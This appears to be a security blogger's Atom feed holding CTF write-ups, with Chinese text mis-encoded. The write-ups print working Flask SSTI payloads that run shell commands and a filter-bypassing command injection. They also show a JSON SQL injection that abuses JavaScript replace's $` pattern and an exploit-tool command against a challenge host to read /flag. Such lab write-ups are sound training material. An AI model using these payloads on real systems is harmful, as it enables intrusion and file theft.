<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>é›²æµã®Lowest World</title>
  
  
  <link href="http://c1oudfl0w0.github.io/blog/atom.xml" rel="self"/>
  
  <link href="http://c1oudfl0w0.github.io/blog/"/>
  <updated>2025-01-18T12:20:37.734Z</updated>
  <id>http://c1oudfl0w0.github.io/blog/</id>
  
  <author>
    <name>C1oudfL0w0</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ç¬¬å…«å±Šè¥¿æ¹–è®ºå‰‘</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/01/18/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/01/18/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/</id>
    <published>2025-01-18T01:58:56.000Z</published>
    <updated>2025-01-18T12:20:37.734Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æ‰€ä»¥ å·²ç»æ²¡äº‹äº†ğŸ˜„</p><span id="more"></span><p><img src="/blog/2025/01/18/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118174518066.png" alt="image-20250118174518066"></p><hr><h1 id="Rank-l"><a href="#Rank-l" class="headerlink" title="Rank-l"></a>Rank-l</h1><p>è¾“å…¥ä¸€äº›å…¶ä»–å­—ç¬¦ï¼Œç„¶åè¾“å…¥å¯†ç ä¼šæŠ¥é”™å¼¹å‡ºflask debugç•Œé¢</p><p>æ³„éœ² app.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> is_safe_input<span class="token punctuation">(</span>phone<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> phone <span class="token operator">!=</span> <span class="token string">"1686682318"</span> <span class="token keyword">and</span> password <span class="token operator">!=</span> <span class="token string">"Happy_news_admin"</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>'<span class="token operator">&lt;</span>!DOCTYPE html<span class="token operator">></span>\    <span class="token operator">&lt;</span>html lang<span class="token operator">=</span><span class="token string">"en"</span><span class="token operator">></span>\    <span class="token operator">&lt;</span>head<span class="token operator">></span>\        <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token operator">></span>\        <span class="token operator">&lt;</span>title<span class="token operator">></span>login failed<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span>\    <span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span>\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾—åˆ°è´¦å¯†<code>1686682318:Happy_news_admin</code></p><p>ä½†æ˜¯è¾“å…¥æ­£ç¡®åä¾æ—§é‡å®šå‘å› &#x2F;</p><p>çŒœæµ‹æ˜¯åœ¨ render_template_string æ‰“ sstiï¼Œåœ¨&#x2F;loginå¤„å¡«payloadï¼Œåœ¨&#x2F;cpasså¤„è·å–å›æ˜¾</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum.__globals__.os.popen<span class="token punctuation">(</span><span class="token string">'ls ..'</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>flagåœ¨ &#x2F;flagf149</p><p>app.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> render_template_string<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> abort<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> unquoteapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>phone <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">def</span> <span class="token function">is_safe_input</span><span class="token punctuation">(</span>user_input<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># unsafe_keywords = ['eval', 'exec', 'os', 'system', 'import', '__import__']</span>    unsafe_keywords <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">,</span><span class="token string">'?'</span><span class="token punctuation">,</span><span class="token string">'*'</span><span class="token punctuation">,</span><span class="token string">'-'</span><span class="token punctuation">,</span><span class="token string">'less'</span><span class="token punctuation">,</span><span class="token string">'nl'</span><span class="token punctuation">,</span><span class="token string">'tac'</span><span class="token punctuation">,</span><span class="token string">'more'</span><span class="token punctuation">,</span><span class="token string">'tail'</span><span class="token punctuation">,</span><span class="token string">'od'</span><span class="token punctuation">,</span><span class="token string">'grep'</span><span class="token punctuation">,</span><span class="token string">'awd'</span><span class="token punctuation">,</span><span class="token string">'sed'</span><span class="token punctuation">,</span><span class="token string">'64'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token string">'%2f'</span><span class="token punctuation">,</span><span class="token string">'%2F'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ„é€ rceï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>%26%26head f<span class="token punctuation">\</span>lagf149<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/01/18/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118105248402.png" alt="image-20250118105248402"></p><hr><h1 id="Rank-Uï¼ˆUnsolvedï¼‰"><a href="#Rank-Uï¼ˆUnsolvedï¼‰" class="headerlink" title="Rank-Uï¼ˆUnsolvedï¼‰"></a>Rank-Uï¼ˆUnsolvedï¼‰</h1><p>è¿›å»ä¸€ä¸ªç™»å½•æ¡†ï¼Œå¼±å¯†ç çˆ†ç ´å¤±è´¥ï¼Œsqlæ³¨å…¥æ— æœ</p><p>PHP&#x2F;7.3.28 Apache&#x2F;2.4.38 (Debian)</p><p>æ¢äº†å‡ ä¸ªå­—å…¸ï¼Œæœ€ç»ˆçˆ†å‡º year2000</p><p>é‡Œé¢ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œå•¥éƒ½èƒ½ä¼ ï¼Œä½†æ˜¯è®¿é—® Uploads é‡Œçš„æ–‡ä»¶è·¯å¾„åªæœ‰ jpg åç¼€çš„èƒ½è¯»åˆ°ï¼ŒçŒœæµ‹å…¶ä»–åç¼€æ˜¯è¢«åˆ äº†</p><p>å°è¯•æ¡ä»¶ç«äº‰ï¼Œpyè„šæœ¬+burpæŠŠæˆ‘cç›˜ç¼“å­˜æ·¦çˆ†äº†éƒ½æ²¡ç«äº‰æˆåŠŸ</p><hr><h1 id="sqli-or-notï¼ˆå¤ç°ï¼‰"><a href="#sqli-or-notï¼ˆå¤ç°ï¼‰" class="headerlink" title="sqli or notï¼ˆå¤ç°ï¼‰"></a>sqli or notï¼ˆå¤ç°ï¼‰</h1><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span>res<span class="token punctuation">,</span>next</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>info<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\,</span><span class="token regex-delimiter">/</span><span class="token regex-flags">ig</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'hacker1!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">var</span> info <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>info<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>info<span class="token punctuation">.</span>username<span class="token operator">&amp;&amp;</span>info<span class="token punctuation">.</span>password<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">var</span> username <span class="token operator">=</span> info<span class="token punctuation">.</span>username<span class="token punctuation">;</span>            <span class="token keyword">var</span> password <span class="token operator">=</span> info<span class="token punctuation">.</span>password<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>info<span class="token punctuation">.</span>username<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\'|\"|\\</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span> <span class="token operator">||</span> info<span class="token punctuation">.</span>password<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\'|\"|\\</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'hacker2!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">var</span> sql <span class="token operator">=</span> <span class="token string">"select * from userinfo where username = '&#123;username&#125;' and password = '&#123;password&#125;'"</span><span class="token punctuation">;</span>            sql <span class="token operator">=</span> sql<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&#123;username&#125;"</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span>            sql <span class="token operator">=</span> sql<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&#123;password&#125;"</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>            connection<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span>sql<span class="token punctuation">,</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span>rs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'error1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>rs<span class="token punctuation">.</span>length<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'username or password error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"please input the data"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>       <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"please input the data"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åªéœ€è¦è¿”å›æˆåŠŸå³å¯å¾—åˆ°flag</p><p>æˆ‘ä»¬ä¼ è¿›å»çš„å‚æ•°æ˜¯infoï¼Œå†…å®¹æ˜¯json</p><p>é¦–å…ˆæ˜¯ç¬¬ä¸€ä¸ªwafï¼ŒåŒ¹é…<code>,</code>ï¼Œåªéœ€è¦urlç¼–ç å³å¯ç»•è¿‡</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"1"</span>%2C<span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åæ˜¯ç¬¬äºŒä¸ªwafï¼ŒåŒ¹é…çš„æ˜¯ info é‡Œçš„<code>&#39;</code>ï¼Œ<code>&quot;</code>ï¼Œ<code>\\</code></p><p>è¦æƒ³æ³¨å…¥çš„è¯è‚¯å®šè¦ä¸€ä¸ª<code>&#39;</code>æˆ–è€…<code>\</code>æ¥è½¬ä¹‰ï¼Œ</p><p>æœŸæœ›çš„sqlè¯­å¥</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> userinfo <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'1\' and password = '</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token comment">#'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆ–è€…</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">select * from userinfo where username &#x3D; &#39;1&#39;&#39; and password &#x3D; &#39;;select 1--&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½†æ˜¯æµ‹äº†åŠå¤©éƒ½è½¬ä¹‰ä¸å‡ºæƒ³è¦çš„æ•ˆæœ</p><br><h2 id="æ­£è§£"><a href="#æ­£è§£" class="headerlink" title="æ­£è§£"></a>æ­£è§£</h2><p>ä¼°è®¡æ˜¯è¦ä» replace å…¥æ‰‹ï¼Œæ¨¡æ¿å­—ç¬¦ä¸²æ›¿æ¢çš„å†™æ³•æ„Ÿè§‰æœ‰è¯´æ³•</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> sql <span class="token operator">=</span> <span class="token string">"select * from userinfo where username = '&#123;username&#125;' and password = '&#123;password&#125;'"</span><span class="token punctuation">;</span>sql <span class="token operator">=</span> sql<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&#123;username&#125;"</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span>sql <span class="token operator">=</span> sql<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&#123;password&#125;"</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>çœ‹ä¸€ä¸‹replaceçš„æºç ï¼š</p><pre class="line-numbers language-tsx" data-language="tsx"><code class="language-tsx"><span class="token comment">/** * Replaces text in a string, using this regular expression. * @param string A String object or string literal whose contents matching against *               this regular expression will be replaced * @param replacer A function that returns the replacement text. */</span><span class="token punctuation">[</span>Symbol<span class="token punctuation">.</span>replace<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token function-variable function">replacer</span><span class="token operator">:</span> <span class="token punctuation">(</span>substring<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token operator">...</span>args<span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token builtin">string</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>replace æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼ï¼Œåœ¨MDNæ–‡æ¡£é‡Œèƒ½æ‰¾åˆ°å†…ç½®çš„æ­£åˆ™é™æ€å±æ€§ï¼š<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp/leftContext">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp/leftContext</a></p><blockquote><p><strong>leftContext</strong> éæ ‡å‡†å±æ€§æ˜¯æ­£åˆ™è¡¨è¾¾å¼çš„é™æ€å’Œåªè¯»å±æ€§ï¼Œå«æœ‰æœ€æ–°åŒ¹é…çš„å·¦ä¾§å­ä¸²ã€‚ RegExp.$&#96; æ˜¯è¿™ä¸ªå±æ€§çš„åˆ«åã€‚</p></blockquote><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">RegExp<span class="token punctuation">.</span>leftContextRegExp<span class="token punctuation">[</span><span class="token string">'$`'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æµ‹è¯•ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> sql <span class="token operator">=</span> <span class="token string">"select * from t_user where username = '&#123;username&#125;' and password = '&#123;password&#125;'"</span><span class="token punctuation">;</span>sql <span class="token operator">=</span> sql<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&#123;username&#125;"</span><span class="token punctuation">,</span> <span class="token string">"$`"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>sql <span class="token operator">=</span> sql<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&#123;password&#125;"</span><span class="token punctuation">,</span> <span class="token string">"$`"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è¿”å›</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> t_user <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'select * from t_user where username = '' and password = '</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> t_user <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'select * from t_user where username = '' and password = '</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™æ ·å°±æ‹¿åˆ°æˆ‘ä»¬éœ€è¦çš„<code>&#39;</code>äº†</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"$`"</span>%2C<span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">select * from t_user where username &#x3D; &#39;select * from t_user where username &#x3D; &#39;&#39; and password &#x3D; &#39;1&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åæ„é€ æ³¨å…¥å¾—åˆ°payloadï¼š</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"$`"</span>%2C<span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"or 1%23"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> t_user <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'select * from t_user where username = '' and password = '</span><span class="token operator">or</span> <span class="token number">1</span><span class="token comment">#'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/01/18/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118165020071.png" alt="image-20250118165020071"></p><p>ç„¶åå°±ä¼šä¸‹è½½åˆ°flagäº†ï¼ˆè¿™é‡Œå¯ä»¥çŸ¥é“æ•°æ®åº“ä¸æ˜¯sqliteï¼Œsqliteçš„æ³¨é‡Šç¬¦æ˜¯<code>--</code>ï¼‰</p><p><img src="/blog/2025/01/18/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118174053483.png" alt="image-20250118174053483"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;æ‰€ä»¥ å·²ç»æ²¡äº‹äº†ğŸ˜„&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>2024æ˜¥ç§‹æ¯å†¬å­£èµ›</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/01/17/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/01/17/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/</id>
    <published>2025-01-17T02:31:51.000Z</published>
    <updated>2025-01-19T11:35:37.180Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä½ ä»€ä¹ˆæ¯”èµ›ä½ æ’è¥¿æ¹–è®ºå‰‘ï¼ˆ</p><p>day2çš„é¢˜æ²¡åšï¼Œæ”¾ç€ä¸ç®¡ï¼</p><span id="more"></span><hr><h1 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h1><p>ç›´æ¥sstiç§’äº†</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="file-copy"><a href="#file-copy" class="headerlink" title="file_copy"></a>file_copy</h1><p>æ–‡ä»¶å¤åˆ¶ï¼Œæ”¯æŒä¼ªåè®®ï¼Œä½†æ˜¯é™¤äº†æ–‡ä»¶å¤§å°å°±æ²¡æœ‰å…¶ä»–å›æ˜¾ï¼Œæµ‹å‡ºæ¥ flag åœ¨&#x2F;flag</p><p>é‚£æ˜æ˜¾æ˜¯ä¾§ä¿¡é“ç›²æ³¨</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 filters_chain_oracle_exploit.py <span class="token parameter variable">--target</span> http://eci-2ze470339l9n5s7flrul.cloudeci1.ichunqiu.com/ <span class="token parameter variable">--parameter</span> path <span class="token parameter variable">--file</span> /flag <span class="token parameter variable">--time_based_atta</span>ck True <span class="token parameter variable">--match</span> <span class="token string">"Allowed memory size"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/blog/2025/01/17/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/image-20250117111643538.png" alt="image-20250117111643538"></p><hr><h1 id="Gotarï¼ˆå¤ç°ï¼‰"><a href="#Gotarï¼ˆå¤ç°ï¼‰" class="headerlink" title="Gotarï¼ˆå¤ç°ï¼‰"></a>Gotarï¼ˆå¤ç°ï¼‰</h1><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"Gotar/config"</span><span class="token string">"Gotar/controllers"</span><span class="token string">"Gotar/db"</span><span class="token string">"Gotar/middleware"</span><span class="token string">"log"</span><span class="token string">"net/http"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>config<span class="token punctuation">.</span><span class="token function">LoadEnv</span><span class="token punctuation">(</span><span class="token punctuation">)</span>db<span class="token punctuation">.</span><span class="token function">Init</span><span class="token punctuation">(</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">Handle</span><span class="token punctuation">(</span><span class="token string">"/assets/"</span><span class="token punctuation">,</span> http<span class="token punctuation">.</span><span class="token function">StripPrefix</span><span class="token punctuation">(</span><span class="token string">"/assets/"</span><span class="token punctuation">,</span> http<span class="token punctuation">.</span><span class="token function">FileServer</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span><span class="token function">Dir</span><span class="token punctuation">(</span><span class="token string">"assets"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> middleware<span class="token punctuation">.</span><span class="token function">AuthMiddleware</span><span class="token punctuation">(</span>controllers<span class="token punctuation">.</span>IndexHandler<span class="token punctuation">)</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/register"</span><span class="token punctuation">,</span> controllers<span class="token punctuation">.</span>RegisterHandler<span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">,</span> controllers<span class="token punctuation">.</span>LoginHandler<span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/logout"</span><span class="token punctuation">,</span> controllers<span class="token punctuation">.</span>LogoutHandler<span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/upload"</span><span class="token punctuation">,</span> middleware<span class="token punctuation">.</span><span class="token function">AuthMiddleware</span><span class="token punctuation">(</span>controllers<span class="token punctuation">.</span>UploadHandler<span class="token punctuation">)</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/files"</span><span class="token punctuation">,</span> middleware<span class="token punctuation">.</span><span class="token function">AuthMiddleware</span><span class="token punctuation">(</span>controllers<span class="token punctuation">.</span>FilesHandler<span class="token punctuation">)</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/download/"</span><span class="token punctuation">,</span> middleware<span class="token punctuation">.</span><span class="token function">AuthMiddleware</span><span class="token punctuation">(</span>controllers<span class="token punctuation">.</span>DownloadHandler<span 